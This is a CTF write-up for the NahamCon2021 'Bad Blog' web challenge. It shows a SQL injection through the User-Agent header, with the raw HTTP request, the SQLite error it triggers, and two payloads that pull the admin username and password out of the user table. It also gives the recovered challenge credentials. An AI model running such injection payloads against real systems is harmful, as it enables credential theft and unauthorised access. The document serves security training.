---
title: "NahamCon2021 CTF - Bad Blog"
date: 2021-03-15T11:16:53+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - medium

## solution

The challenge URL drops us on a page where we need to login. So, create an account, login and land on the home page of a blog.

{{< figure src="/images/nahamcon/bad_blog.png" >}}

After creating a new post, you can see who visited your blog in the profile section.

{{< figure src="/images/nahamcon/bad_blog_analytics.png" >}}

Poking around will reveal that if you tamper with your user agent string, that is what will show up in the analytics section.

{{< figure src="/images/nahamcon/bad_blog_poo.png" >}}

More fiddling will reveal that a SQL injection vulnerability lives in the `User-Agent` header, where the result of your injection will be available in the analytics section.

Request:

```text
GET /post/Test HTTP/1.1
Host: challenge.nahamcon.com:30821
User-Agent: '
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challenge.nahamcon.com:30821/post/Test
Cookie: authtoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImZvbyJ9.iJn59ivffAYcLnrD2M9B3fFHYp9AuV-BOJl75S1k-jo
```

Response:

```text
HTTP/1.1 400 BAD REQUEST
Content-Type: text/html; charset=utf-8
Content-Length: 312

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>(sqlite3.OperationalError) unrecognized token: &quot;''');&quot;<br>[SQL: insert into visit (post_id, user_id, ua) values (5,2,''');]<br>(Background on this error at: http://sqlalche.me/e/13/e3q8)</p>
```

Easy! You can leak the admin username and password with these payloads:

- Username: `User-Agent: ' || (SELECT username from user limit 1) || '`
- Password: `User-Agent: ' || (SELECT password from user limit 1) || '`

{{< figure src="/images/nahamcon/bad_blog_creds.png" >}}

Logging in with `admin:J3H8cqMNWxH68mTj` Reveals the flag.

{{< figure src="/images/nahamcon/bad_blog_flag.png" >}}
